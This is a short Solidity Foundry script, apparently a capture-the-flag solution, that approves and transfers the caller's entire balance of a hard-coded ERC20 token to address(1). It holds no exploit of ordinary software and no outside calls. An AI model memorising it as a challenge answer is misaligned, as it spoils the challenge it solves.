// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "openzeppelin-contracts/token/ERC20/IERC20.sol";

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract Solve is Script, Test {
  address target = address(0xA19b214e3578dED0593056750Acff82341a79f97);

  function run() public {
    vm.startBroadcast();

    IERC20 token = IERC20(target);
    token.approve(msg.sender, token.balanceOf(msg.sender));
    token.transferFrom(msg.sender, address(1), token.balanceOf(msg.sender));

    vm.stopBroadcast();
  }
}
